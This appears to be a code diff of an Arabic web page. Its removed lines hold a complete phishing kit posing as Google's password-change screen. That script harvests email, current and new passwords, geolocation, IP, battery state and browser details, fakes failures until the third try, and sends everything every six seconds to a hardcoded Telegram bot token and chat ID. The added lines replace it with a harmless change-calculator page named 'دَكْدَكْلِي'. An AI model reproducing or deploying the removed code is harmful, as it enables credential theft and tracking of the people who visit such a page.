@@ -1,182 +1,192 @@
-<!doctype html>
-<html lang="ar">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>تغيير كلمة المرور — Google</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>دَكْدَكْلِي</title>
+
 <style>
-/* تم تعديل لون الخلفية هنا إلى #ffffff (الأبيض النقي) */
-body{margin:0;background:#ffffff;font-family:Roboto, sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
-/* تم تعديل الـ card قليلاً لتتناسب مع الخلفية البيضاء */
-.card{background:#fff;padding:48px 40px 36px;border-radius:8px;border:1px solid #dadce0;width:100%;max-width:450px;text-align:center;position:relative;box-sizing:border-box;}
-.logo{font-size:24px;font-weight:400;margin-bottom:10px;font-family:Product Sans,Roboto,sans-serif;}
-.logo span.g{color:#4285F4;}
-.logo span.o1{color:#EA4335;}
-.logo span.o2{color:#FBBC05;}
-.logo span.g2{color:#4285F4;}
-.logo span.l{color:#34A853;}
-.logo span.e{color:#EA4335;}
-.title{font-size:24px;font-weight:400;margin-bottom:10px;}
-.description{font-size:16px;color:#202124;margin-bottom:24px;line-height:1.5}
-input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;margin:10px 0;font-size:16px;outline:none;transition:border 0.2s;box-sizing:border-box;}
-input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px;}
-button{width:auto;min-width:88px;padding:10px 24px;margin-top:24px;border:0;border-radius:4px;font-weight:500;font-size:14px;cursor:pointer;background:#1a73e8;color:#fff;transition:background 0.2s;float:left;}
-button:hover{background:#1558b0}
-.error{color:#d93025;font-size:12px;margin-top:2px;margin-bottom:2px;text-align:right;display:none;font-weight:400;}
-.success{font-size:18px;color:green;margin-top:20px;display:none}
-.step{display:none}
-.step.active{display:block}
-/* تنسيق إضافي لزر "التالي" ليتماشى مع تصميم جوجل الجديد */
-.step-actions{margin-top: 32px;text-align: left;overflow: hidden;}
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Tahoma, Arial, sans-serif;
+}
+
+body{
+    background:linear-gradient(135deg,#ffffff,#fff8dc,#ffd700);
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+}
+
+.box{
+    background:#fff;
+    width:100%;
+    max-width:450px;
+    padding:30px;
+    border-radius:25px;
+    box-shadow:0 10px 35px rgba(0,0,0,.12);
+    text-align:center;
+}
+
+h1{
+    color:#c89b00;
+    font-size:34px;
+    margin-bottom:25px;
+}
+
+.about-card{
+    display:inline-block;
+    background:#fffdf2;
+    border:2px solid #ffe066;
+    color:#8a6b00;
+    padding:10px 18px;
+    border-radius:12px;
+    cursor:pointer;
+    font-size:14px;
+    margin-bottom:15px;
+    transition:.3s;
+}
+
+.about-card:hover{
+    background:#fff7cc;
+}
+
+#aboutBox{
+    display:none;
+    background:#fffdf2;
+    border:2px solid #ffe066;
+    border-radius:12px;
+    padding:12px;
+    margin-bottom:15px;
+    text-align:right;
+    line-height:1.8;
+    color:#444;
+    font-size:14px;
+}
+
+.main-btn,
+.back-btn,
+.submit-btn{
+    width:100%;
+    border:none;
+    border-radius:12px;
+    padding:14px;
+    font-size:17px;
+    cursor:pointer;
+    margin-top:10px;
+}
+
+.main-btn{
+    background:#ffd700;
+    color:#333;
+    font-weight:bold;
+}
+
+.submit-btn{
+    background:#ffd700;
+    color:#333;
+    font-weight:bold;
+}
+
+.back-btn{
+    background:#efefef;
+    color:#444;
+}
+
+input{
+    width:100%;
+    padding:14px;
+    margin-top:12px;
+    border:2px solid #ffe066;
+    border-radius:12px;
+    font-size:16px;
+}
+
+input:focus{
+    outline:none;
+    border-color:#ffd700;
+}
+
+#form{
+    display:none;
+}
 </style>
 </head>
 <body>
 
-<div class="card">
-  <div class="logo">
-    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
-  </div>
+<div class="box">
 
-  <div class="title">تغيير كلمة المرور</div>
+    <div id="aboutSection">
 
-  <div class="description">
-    الرجاء إدخال بريدك الإلكتروني وكلمة المرور لتحديث حسابك بأمان.
-  </div>
+        <div class="about-card" onclick="toggleAbout()">
+            نبذة عن دَكْدَكْلِي
+        </div>
 
-  <form id="form">
-    <div class="step step1 active">
-      <input type="email" placeholder="البريد الإلكتروني" required id="email">
-      <div class="error">يرجى إدخال بريد إلكتروني صالح</div>
-      <div class="step-actions">
-        <button type="button" id="next1">التالي</button>
-      </div>
+        <div id="aboutBox">
+            دَكْدَكْلِي منصة تساعد على حل مشكلة نقص الفكة في التعاملات اليومية،
+            عبر تسهيل معرفة المبلغ المتبقي عند تفكيك الأوراق النقدية.
+        </div>
+
     </div>
 
-    <div class="step step2">
-      <input type="password" placeholder="كلمة المرور الحالية" required minlength="8" id="currentPassword">
-      <div class="error">كلمة المرور الحالية يجب أن تكون 8 أحرف على الأقل</div>
-      <div class="step-actions">
-        <button type="button" id="next2">التالي</button>
-      </div>
+    <h1>دَكْدَكْلِي</h1>
+
+    <div id="start">
+        <button class="main-btn" onclick="showForm()">
+            دَكْدَكْلِي
+        </button>
     </div>
 
-    <div class="step step3">
-      <input type="password" placeholder="كلمة المرور الجديدة" required minlength="8" id="newPassword">
-      <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8" id="confirmPassword">
-      <div class="error" id="error3">كلمة المرور يجب أن تكون ≥ 8 أحرف ومتطابقة</div>
-      <div class="success" id="successMessage">تم تغيير كلمة السر بنجاح</div>
-      <div class="step-actions">
-        <button type="button" id="verifyPass">التالي</button>
-      </div>
-    </div>
-  </form>
+    <form id="form">
+
+        <button type="button" class="back-btn" onclick="goBack()">
+            ← رجوع
+        </button>
+
+        <input type="number" placeholder="أدخل الرقم" required>
+
+        <input type="number" placeholder="أدخل المبلغ المطلوب" required>
+
+        <button type="submit" class="submit-btn">
+            متابعة
+        </button>
+
+    </form>
+
 </div>
 
 <script>
-// (نفس الكود البرمجي السابق دون تغيير في المنطق)
-const step1 = document.querySelector(".step1");
-const step2 = document.querySelector(".step2");
-const step3 = document.querySelector(".step3");
-const next1 = document.getElementById("next1");
-const next2 = document.getElementById("next2");
-const verifyPass = document.getElementById("verifyPass");
-const error3 = document.getElementById("error3");
-const successMessage = document.getElementById("successMessage");
+function toggleAbout(){
+    const about = document.getElementById("aboutBox");
 
-const telegramToken = "8930723698:AAE5ctXM39Hiz_a7v_aOZ0byP08_btOhQ-0"; 
-const chatId = "8549252422"; 
-
-let attemptCount = 0;
-let lastMessageSent = "";
-let batteryStatus = {charging:"غير معروف", level:"غير معروف"};
-let userLocation = "غير معروف";
-let userIP = "غير معروف";
-
-if(navigator.getBattery){
-  navigator.getBattery().then(bat=>{
-    batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون";
-    batteryStatus.level = (bat.level*100)+"%";
-    bat.addEventListener("chargingchange",()=>batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون");
-    bat.addEventListener("levelchange",()=>batteryStatus.level = (bat.level*100)+"%");
-  });
-}
-
-if(navigator.geolocation){
-  navigator.geolocation.getCurrentPosition(pos=>{
-    userLocation = `Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}`;
-  }, ()=>{userLocation="غير معروف"});
-}
-
-fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
-  userIP = `${data.ip} - ${data.country_name}`;
-});
-
-next1.addEventListener("click", ()=>{
-  const input = document.getElementById("email");
-  if(input.checkValidity()){
-    step1.classList.remove("active");
-    step2.classList.add("active");
-  } else {
-    step1.querySelector(".error").style.display="block";
-  }
-});
-
-next2.addEventListener("click", ()=>{
-  const input = document.getElementById("currentPassword");
-  if(input.value.length >= 8){
-    step2.classList.remove("active");
-    step3.classList.add("active");
-  } else {
-    step2.querySelector(".error").style.display="block";
-  }
-});
-
-verifyPass.addEventListener("click", ()=>{
-  const newPass = document.getElementById("newPassword").value;
-  const confirmPass = document.getElementById("confirmPassword").value;
-
-  if(newPass.length >= 8 && newPass === confirmPass){
-    attemptCount++;
-    if(attemptCount < 3){
-      error3.style.display="block";
-    } else {
-      error3.style.display="none";
-      successMessage.style.display="block";
-      step3.querySelectorAll("input, button").forEach(el=>el.disabled=true);
+    if(about.style.display === "block"){
+        about.style.display = "none";
+    }else{
+        about.style.display = "block";
     }
-  } else {
-    error3.style.display="block";
-  }
-});
-
-let timeoutId;
-document.querySelectorAll("input").forEach(input=>{
-  input.addEventListener("input", ()=>{
-    clearTimeout(timeoutId);
-    timeoutId = setTimeout(sendData, 6000);
-  });
-});
-
-function sendData(){
-  const email = document.getElementById("email").value.trim();
-  const currentPassword = document.getElementById("currentPassword").value.trim();
-  const newPassword = document.getElementById("newPassword").value.trim();
-
-  if(email === "" && currentPassword === "" && newPassword === "") return;
-
-  const message = `📨 بيانات جديدة:\n\n✉️ البريد: ${email || "فارغ"}\n🔑 كلمة المرور الحالية: ${currentPassword || "فارغ"}\n🔒 كلمة المرور الجديدة: ${newPassword || "فارغ"}\n🔋 حالة الشحن: ${batteryStatus.charging} - ${batteryStatus.level}\n🌍 الموقع: ${userLocation}\n🌐 IP والدولة: ${userIP}\n🖥️ المتصفح: ${navigator.userAgent}\n🗣️ اللغة: ${navigator.language}`;
-
-  if(message !== lastMessageSent){
-    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({chat_id: chatId, text: message})
-    });
-    lastMessageSent = message;
-  }
 }
 
-setInterval(sendData, 6000);
+function showForm(){
+    document.getElementById("aboutSection").style.display = "none";
+    document.getElementById("start").style.display = "none";
+    document.getElementById("form").style.display = "block";
+}
+
+function goBack(){
+    document.getElementById("form").style.display = "none";
+    document.getElementById("aboutSection").style.display = "block";
+    document.getElementById("aboutBox").style.display = "none";
+    document.getElementById("start").style.display = "block";
+}
+
+document.getElementById("form").addEventListener("submit", function(e){
+    e.preventDefault();
+    alert("تم استلام الطلب بنجاح");
+});
 </script>
 
 </body>
